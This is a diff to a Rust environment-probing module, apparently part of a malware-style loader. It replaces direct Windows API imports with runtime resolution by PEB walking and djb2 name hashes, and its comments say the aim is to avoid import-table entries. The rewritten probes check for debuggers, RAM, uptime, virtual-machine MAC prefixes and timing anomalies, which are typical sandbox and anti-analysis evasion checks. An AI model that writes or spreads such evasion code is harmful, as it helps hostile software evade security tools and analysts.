@@ -11,6 +11,157 @@
 
 use std::path::Path;
 
+// ── pe_resolve helpers (Windows) ──────────────────────────────────────────────
+#[cfg(windows)]
+mod win_resolve {
+    use std::sync::atomic::{AtomicU64, Ordering};
+
+    // ── Local type definitions (avoiding IAT-producing winapi imports) ──────
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct MemoryStatusEx {
+        pub dw_length: u32,
+        pub dw_memory_load: u32,
+        pub ull_total_phys: u64,
+        pub ull_avail_phys: u64,
+        pub ull_total_page_file: u64,
+        pub ull_avail_page_file: u64,
+        pub ull_total_virtual: u64,
+        pub ull_avail_virtual: u64,
+        pub ull_avail_extended_virtual: u64,
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    pub struct SystemInfo {
+        _processor_union: [u32; 1],
+        pub dw_page_size: u32,
+        _lp_minimum_application_address: *mut std::ffi::c_void,
+        _lp_maximum_application_address: *mut std::ffi::c_void,
+        _dw_active_processor_mask: usize,
+        pub dw_number_of_processors: u32,
+        _dw_processor_type: u32,
+        _dw_allocation_granularity: u32,
+        _w_processor_level: u16,
+        _w_processor_revision: u16,
+    }
+
+    /// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
+    pub const fn hash_str_const(s: &[u8]) -> u32 {
+        let mut h: u32 = pe_resolve::SEED;
+        let mut i = 0;
+        while i < s.len() {
+            h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
+            i += 1;
+        }
+        h
+    }
+
+    /// Compile-time djb2 hash for wide strings (matches pe_resolve::hash_wstr).
+    pub const fn hash_wstr_const(w: &[u16]) -> u32 {
+        let mut h: u32 = pe_resolve::SEED;
+        let mut i = 0;
+        while i < w.len() {
+            h = h.wrapping_mul(31).wrapping_add(w[i] as u32);
+            i += 1;
+        }
+        h
+    }
+
+    /// Resolve a function pointer from a DLL that is already loaded in the PEB.
+    pub unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
+        let module = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)?;
+        Some(std::mem::transmute_copy(&addr))
+    }
+
+    /// Resolve a function pointer from a DLL, loading it if not already present.
+    pub unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T> {
+        let module = match pe_resolve::get_module_handle_by_hash(dll_hash) {
+            Some(m) => m,
+            None => {
+                let load_library_w: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
+                    resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
+                let m = load_library_w(dll_wide.as_ptr());
+                if m.is_null() {
+                    return None;
+                }
+                m
+            }
+        };
+        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)?;
+        Some(std::mem::transmute_copy(&addr))
+    }
+
+    // ── DLL wide strings & hashes ──────────────────────────────────────────────
+    pub const USER32_DLL_W: &[u16] = &['u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+    pub const HASH_USER32_DLL: u32 = hash_wstr_const(USER32_DLL_W);
+
+    pub const ADVAPI32_DLL_W: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+    pub const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
+
+    pub const IPHLPAPI_DLL_W: &[u16] = &['i' as u16, 'p' as u16, 'h' as u16, 'l' as u16, 'p' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+    pub const HASH_IPHLPAPI_DLL: u32 = hash_wstr_const(IPHLPAPI_DLL_W);
+
+    // ── API hash constants (kernel32) ──────────────────────────────────────────
+    pub const HASH_GLOBALMEMORYSTATUSEX: u32 = hash_str_const(b"GlobalMemoryStatusEx\0");
+    pub const HASH_GETSYSTEMINFO: u32       = hash_str_const(b"GetSystemInfo\0");
+    pub const HASH_GETTICKCOUNT64: u32      = hash_str_const(b"GetTickCount64\0");
+    pub const HASH_ISDEBUGGERPRESENT: u32   = hash_str_const(b"IsDebuggerPresent\0");
+    pub const HASH_GETSYSTEMTIMES: u32      = hash_str_const(b"GetSystemTimes\0");
+    pub const HASH_GETDISKFREESPACEEXW: u32 = hash_str_const(b"GetDiskFreeSpaceExW\0");
+
+    // ── API hash constants (user32) ────────────────────────────────────────────
+    pub const HASH_GETCURSORPOS: u32          = hash_str_const(b"GetCursorPos\0");
+    pub const HASH_ENUMWINDOWS: u32           = hash_str_const(b"EnumWindows\0");
+    pub const HASH_ISWINDOWVISIBLE: u32       = hash_str_const(b"IsWindowVisible\0");
+    pub const HASH_GETWINDOWTEXTLENGTHW: u32   = hash_str_const(b"GetWindowTextLengthW\0");
+
+    // ── API hash constants (advapi32) ──────────────────────────────────────────
+    pub const HASH_REGOPENKEYEXW: u32   = hash_str_const(b"RegOpenKeyExW\0");
+    pub const HASH_REGQUERYVALUEEXW: u32 = hash_str_const(b"RegQueryValueExW\0");
+    pub const HASH_REGCLOSEKEY: u32     = hash_str_const(b"RegCloseKey\0");
+
+    // ── API hash constants (iphlpapi) ──────────────────────────────────────────
+    pub const HASH_GETADAPTERSADDRESSES: u32 = hash_str_const(b"GetAdaptersAddresses\0");
+
+    // ── Function pointer types ─────────────────────────────────────────────────
+
+    // kernel32
+    pub type FnGlobalMemoryStatusEx = unsafe extern "system" fn(*mut MemoryStatusEx) -> i32;
+    pub type FnGetSystemInfo        = unsafe extern "system" fn(*mut SystemInfo);
+    pub type FnGetTickCount64       = unsafe extern "system" fn() -> u64;
+    pub type FnIsDebuggerPresent    = unsafe extern "system" fn() -> i32;
+    pub type FnGetSystemTimes       = unsafe extern "system" fn(*mut winapi::shared::minwindef::FILETIME, *mut winapi::shared::minwindef::FILETIME, *mut winapi::shared::minwindef::FILETIME) -> i32;
+    pub type FnGetDiskFreeSpaceExW  = unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> i32;
+
+    // user32
+    pub type FnGetCursorPos        = unsafe extern "system" fn(*mut winapi::shared::windef::POINT) -> i32;
+    pub type FnEnumWindows         = unsafe extern "system" fn(Option<unsafe extern "system" fn(winapi::shared::windef::HWND, winapi::shared::minwindef::LPARAM) -> winapi::shared::minwindef::BOOL>, winapi::shared::minwindef::LPARAM) -> i32;
+    pub type FnIsWindowVisible     = unsafe extern "system" fn(winapi::shared::windef::HWND) -> i32;
+    pub type FnGetWindowTextLengthW = unsafe extern "system" fn(winapi::shared::windef::HWND) -> i32;
+
+    // advapi32
+    pub type FnRegOpenKeyExW   = unsafe extern "system" fn(*mut std::ffi::c_void, *const u16, u32, u32, *mut *mut std::ffi::c_void) -> i32;
+    pub type FnRegQueryValueExW = unsafe extern "system" fn(*mut std::ffi::c_void, *const u16, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
+    pub type FnRegCloseKey     = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+
+    // iphlpapi
+    pub type FnGetAdaptersAddresses = unsafe extern "system" fn(u32, u32, *mut std::ffi::c_void, *mut winapi::um::iptypes::IP_ADAPTER_ADDRESSES, *mut u32) -> u32;
+
+    // ── Static atomics for EnumWindows callback ────────────────────────────────
+    pub static ISWINDOWVISIBLE_PTR: AtomicU64 = AtomicU64::new(0);
+    pub static GETWINDOWTEXTLENGTHW_PTR: AtomicU64 = AtomicU64::new(0);
+
+    // ── Local constants (replacing IAT-producing winapi imports) ────────────────
+    pub const KEY_READ: u32 = 0x20019;
+    pub const REG_SZ: u32 = 1;
+    pub const ERROR_SUCCESS: u32 = 0;
+    /// HKEY_LOCAL_MACHINE as a raw pointer constant.
+    pub const HKEY_LOCAL_MACHINE: *mut std::ffi::c_void = 0x80000002u64 as *mut std::ffi::c_void;
+}
+
 /// Outcome of all individual environment probes.
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct EnvReport {
@@ -257,8 +408,11 @@ fn linux_is_debugger_present() -> bool {
 
 #[cfg(windows)]
 fn windows_is_debugger_present() -> bool {
-    use winapi::um::debugapi::IsDebuggerPresent;
-    if unsafe { IsDebuggerPresent() } != 0 {
+    let is_debugger_present: win_resolve::FnIsDebuggerPresent = unsafe {
+        win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, win_resolve::HASH_ISDEBUGGERPRESENT)
+            .expect("IsDebuggerPresent not found")
+    };
+    if unsafe { is_debugger_present() } != 0 {
         return true;
     }
     // Walk the PEB to read BeingDebugged and NtGlobalFlag without depending
@@ -1130,11 +1284,13 @@ fn get_ram_gb() -> u64 {
     }
     #[cfg(windows)]
     unsafe {
-        use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
-        let mut mem: MEMORYSTATUSEX = std::mem::zeroed();
-        mem.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
-        if GlobalMemoryStatusEx(&mut mem) != 0 {
-            mem.ullTotalPhys / (1024 * 1024 * 1024)
+        let global_memory_status_ex: win_resolve::FnGlobalMemoryStatusEx =
+            win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, win_resolve::HASH_GLOBALMEMORYSTATUSEX)
+                .expect("GlobalMemoryStatusEx not found");
+        let mut mem: win_resolve::MemoryStatusEx = std::mem::zeroed();
+        mem.dw_length = std::mem::size_of::<win_resolve::MemoryStatusEx>() as u32;
+        if global_memory_status_ex(&mut mem) != 0 {
+            mem.ull_total_phys / (1024 * 1024 * 1024)
         } else {
             0
         }
@@ -1163,7 +1319,11 @@ fn get_uptime_secs() -> u64 {
     }
     #[cfg(windows)]
     {
-        unsafe { winapi::um::sysinfoapi::GetTickCount64() / 1000 }
+        let get_tick_count_64: win_resolve::FnGetTickCount64 = unsafe {
+            win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, win_resolve::HASH_GETTICKCOUNT64)
+                .expect("GetTickCount64 not found")
+        };
+        unsafe { get_tick_count_64() / 1000 }
     }
     #[cfg(not(any(target_os = "linux", windows)))]
     {
@@ -1733,8 +1893,6 @@ fn windows_mac_prefix_counts(
     virtual_prefixes: &[[u8; 3]],
     excluded_prefixes: &[[u8; 3]],
 ) -> (usize, usize) {
-    use winapi::shared::winerror::ERROR_SUCCESS;
-    use winapi::um::iphlpapi::GetAdaptersAddresses;
     use winapi::um::iptypes::IP_ADAPTER_ADDRESSES;
 
     // AF_UNSPEC = 0; skip address lists we don't need.
@@ -1748,10 +1906,18 @@ fn windows_mac_prefix_counts(
         | GAA_FLAG_SKIP_MULTICAST
         | GAA_FLAG_SKIP_DNS_SERVER;
 
+    let get_adapters_addresses: win_resolve::FnGetAdaptersAddresses = unsafe {
+        win_resolve::resolve_api_or_load(
+            win_resolve::IPHLPAPI_DLL_W,
+            win_resolve::HASH_IPHLPAPI_DLL,
+            win_resolve::HASH_GETADAPTERSADDRESSES,
+        ).expect("GetAdaptersAddresses not found")
+    };
+
     unsafe {
         // First call with a null buffer to obtain the required size.
         let mut buf_size: u32 = 0;
-        GetAdaptersAddresses(
+        get_adapters_addresses(
             AF_UNSPEC,
             flags,
             std::ptr::null_mut(),
@@ -1763,14 +1929,14 @@ fn windows_mac_prefix_counts(
         }
 
         let mut buf: Vec<u8> = vec![0u8; buf_size as usize];
-        let ret = GetAdaptersAddresses(
+        let ret = get_adapters_addresses(
             AF_UNSPEC,
             flags,
             std::ptr::null_mut(),
             buf.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES,
             &mut buf_size,
         );
-        if ret != ERROR_SUCCESS {
+        if ret != win_resolve::ERROR_SUCCESS {
             return (0, 0);
         }
 
@@ -1959,7 +2125,10 @@ fn detect_timing_anomaly() -> bool {
     #[cfg(windows)]
     {
         use winapi::shared::minwindef::FILETIME;
-        use winapi::um::processthreadsapi::GetSystemTimes;
+        let get_system_times: win_resolve::FnGetSystemTimes = unsafe {
+            win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, win_resolve::HASH_GETSYSTEMTIMES)
+                .expect("GetSystemTimes not found")
+        };
         let mut idle = FILETIME {
             dwLowDateTime: 0,
             dwHighDateTime: 0,
@@ -1973,7 +2142,7 @@ fn detect_timing_anomaly() -> bool {
             dwHighDateTime: 0,
         };
         unsafe {
-            GetSystemTimes(&mut idle, &mut kernel, &mut user);
+            get_system_times(&mut idle, &mut kernel, &mut user);
         }
         let to_u64 =
             |ft: FILETIME| -> u64 { ((ft.dwHighDateTime as u64) << 32) | ft.dwLowDateTime as u64 };
@@ -1992,7 +2161,7 @@ fn detect_timing_anomaly() -> bool {
             dwHighDateTime: 0,
         };
         unsafe {
-            GetSystemTimes(&mut idle2, &mut kernel2, &mut user2);
+            get_system_times(&mut idle2, &mut kernel2, &mut user2);
         }
         let idle_delta = to_u64(idle2).saturating_sub(idle0);
         let kernel_delta = to_u64(kernel2).saturating_sub(to_u64(kernel));
